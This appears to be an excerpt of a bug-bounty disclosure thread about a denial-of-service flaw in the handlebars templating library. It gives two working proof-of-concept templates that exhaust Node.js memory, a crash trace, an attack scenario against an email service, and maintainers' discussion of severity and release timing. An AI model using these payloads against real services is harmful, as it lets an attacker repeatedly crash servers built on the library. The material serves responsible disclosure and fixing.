  "vulnerability_information": "I would like to report Denial of service in handlebars.\nIt allows an attacker to crush Node.js process with a small and simple source.\n\n# Module\n\n**module name:** handlebars\n**version:** 4.5.1\n**npm page:** `https://www.npmjs.com/package/handlebars`\n\n## Module Description\n\nHandlebars.js is an extension to the Mustache templating language created by Chris Wanstrath. Handlebars.js and Mustache are both logicless templating languages that keep the view and the code separated like we all know they should be.\n\n## Module Stats\n\n9,223,382 downloads/week\n\n# Vulnerability\n\n## Vulnerability Description\n\nBy default Node.js limiting the max heap size to 700 MB or 1400MB on 32 and 64-bit platforms respectively. When the process consumes all available memory, it crashes. Handlebars doesn't validate the size of the context, so it's possible to create a very big string (using `String#repeat`) or a very big array (using `Array.push`), and concatenate a string or join an array to crash Node.js process. In theory, this exploit will crash node.js process that was started with increased memory limit: `--max-old-space-size=<memory-size>`. \n\n## Steps To Reproduce:\n\nThere are three possible variants of the exploit:\n1. Generate a big string (500Mb) and call `String#concat` on it (the payload size is 124b).\n2. Declare a small string (100b), convert it to array using `String#split` and call thousands of `Array#push/Array#join` (the payload is 88Kb).\n3. Declare a medium size string (10Kb), convert it to array using `String#split` and call hundreds of `Array#push/Array#join` (the payload is 18Kb).\n\n1. The exploit doesn't require input context, it creates everything inside the source.\n2. Create a big size string using `String#repeat`.\n3. Concatenate string with itself.\n4. Compile and run template.\n5. Process crashed.\n\nVariant #1. Generate a big string (500Mb) and call `String#concat` on it:\n```\nconst handlebars = require('handlebars');\n\nlet source = `\n{{#with 'a' as |s0|}}\n  {{#with (s0.repeat 500000000) as |s|}}\n    {{s.concat s}}\n    {{s.concat s}}\n  {{/with}}\n{{/with}}\n`;\n\nlet template = handlebars.compile(source);\ntemplate();\n```\n\nVariant #2. Declare a small string (100b), convert it to array using `String#split` and call thousands of `Array#push/Array#join`:\n```\nconst handlebars = require('handlebars');\n\nlet sourceHeader = `\n{{#with 'ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss' as |s|}}\n  {{#with s.split as |a|}}\n`;\nlet sourceFooter = `\n  {{/with}}\n{{/with}}\n`;\nlet sourceBody = '{{a.push s}}{{a.join}}'.repeat(10 ** 3 * 4);\nlet payload = sourceHeader + sourceBody + sourceFooter;\n\nlet template = handlebars.compile(payload);\ntemplate();\n```\n\nIn both cases Node.js process crashes:\n```\n<--- Last few GCs --->\n\n[11741:0x32299b0]     3929 ms: Mark-sweep 1245.6 (1426.4) -> 1245.6 (1425.4) MB, 33.7 / 0.0 ms  (average mu = 0.685, current mu = 0.001) last resort GC in old space requested\n[11741:0x32299b0]     3963 ms: Mark-sweep 1245.6 (1425.4) -> 1245.6 (1425.4) MB, 34.4 / 0.0 ms  (average mu = 0.501, current mu = 0.001) last resort GC in old space requested\n\n<--- JS stacktrace --->\n\n==== JS stack trace =========================================\n\n    0: ExitFrame [pc: 0xc1315dbe1d]\nSecurity context: 0x2eee53b9e6e1 <JSObject>\n    1: DoJoin(aka DoJoin) [0x2eee53b85e89] [native array.js:~87] [pc=0xc131892da0](this=0x2b1e3fd026f1 <undefined>,l=0x0378b7e7e3e9 <JSArray[6647]>,m=6647,A=0x2b1e3fd028c9 <true>,w=0x2eee53bdc0d9 <String[1]: ,>,v=0x2b1e3fd029a1 <false>)\n    2: Join(aka Join) [0x2eee53b85ed9] [native array.js:1] [bytecode=0xc562a657d09 offset=71](this=0x2b1e3fd026f1 <undefined>...\n\nFATAL ERROR: CALL_AND_RETRY_LAST Allocation failed - JavaScript heap out of memory\n 1: 0x8dc1c0 node::Abort() [node]\n 2: 0x8dc20c  [node]\n 3: 0xad60ae v8::Utils::ReportOOMFailure(v8::internal::Isolate*, char const*, bool) [node]\n 4: 0xad62e4 v8::internal::V8::FatalProcessOutOfMemory(v8::internal::Isolate*, char const*, bool) [node]\n 5: 0xec3972  [node]\n 6: 0xed318f v8::internal::Heap::AllocateRawWithRetryOrFail(int, v8::internal::AllocationSpace, v8::internal::AllocationAlignment) [node]\n 7: 0xea2d3b v8::internal::Factory::NewRawTwoByteString(int, v8::internal::PretenureFlag) [node]\n 8: 0x1191338 v8::internal::Runtime_StringBuilderJoin(int, v8::internal::Object**, v8::internal::Isolate*) [node]\n 9: 0xc1315dbe1d \nAborted (core dumped\n```\n\n## Patch\n\nValidate the size of the context before calling any of its functions.\n1.

For example, Sendgrid - a communication platform for transactional and marketing email, uses Handlebars to create email templates. An attacker can create a template with the payload described above, and send several emails at the same time. This will crash **all running** Node.js. instances. SendGrid uses something like pm2 to restart crushed instances, so they will be restarted automatically, but it takes time, and the attacker can send more requests using some automation. When SendGrid developers will identify a problem using the logs, they won't be able to do anything to prevent this attack (even a complicated regexp for search `repeat`, `push`, `concat` strings in templates doesn't solve the problem), because the problem is inside Handlebars, it must ignore or control `repeat` function and the size of the context.\n\nPut a security disclaimer on the project's README will be as a red flag for black hackers: _use it to kill any server that uses Handlebars_.",

      "message": "Let's take Node.js's built-in `child_process` module. Would you file a command injection vulnerability for the `spawn()` API? Probably not as this is part of the API and by definition allows you to provide commands to it. I use the same rationale for this library. The Denial of Service vulnerability that affects a Node.js service if this library is used depends upon a bad usage of this library's API. Perhaps the template provided to handlebars is a trusted one that only comes from users, or maybe it doesn't but this is context dependent.\n\nThat said, if we were to classify the issue as a buffer overflow type (or perhaps CWE 400 https://cwe.mitre.org/data/definitions/400.htm - Uncontrolled Resource Consumption) then I think the security issue stands and is definitely applicable. In other words, the Denial of Service for a Node.js app is the result of issues in the library, not the cause.\n\nThanks for your diligent questioning @amac, I invited a member of the maintenance team and hope they'll be able to join in soon on the discussion.\n",

The reason we don't want to do that is:\n\nOn the one hand, it might be considered a breaking change, but if you are using Handlebars as it was intended to use (with plain JSON objects), that change isn't breaking. You *can* use instances of custom classes as input, you *can* use \"Date\"-objects and call prototype-methods. But none of those use-cases was ever mentioned in the documentation or in the unit tests (except for one that I added myself this year when I made the first changes to the prototype-treatment. Since semantic-versioning is always based on a documented API or spec, we can argue that it isn't breaking. But I always fear that a few people out there that determine API through trial-and-error and those people might use Handlebars in a non-intended way.\n\nOn the other hand, if we do release the next 4.x with the fix disabled, people probably won't even notice it and they won't activate it. When the exploit is published, there will still be thousands of vulnerable installations out there.\n\nI am convinced that it is better to have slight chance of a semantic versioning violation than an open, known vulnerability.\n\n",

I guess I didn't realize that prohibiting methods like `repeat` and friends would be an option because that could very much be a breaking change for end-users, no? (perhaps unavoidable though)\n\nAlso:\n- I agree about making the change after the holidays to not disrupt people's lives too much if @amac is ok with it too.\n- Making the change public is to some extend ok if unavoidable. I'd warrant that generally speaking there could be automated bots tracking this kind of activity too. If we're able to make the public change in proximity to when the actual release will take place then that's better to not have them too far out.\n\n@knappi79 about the version change and semantic releases - I will point out that if a use's only way to update for a security fix is via possibly breaking APIs then that's not the ideal behaviour, especially as these days there are many auto upgrade bots. That said, from what you are saying, it is either going to need someone to turn on a flag, or upgrade to a major version, but either way it will end up being a breaking change for them. Is that correct? if so, I'm ok with your original thought of the release process.\n\n\n",
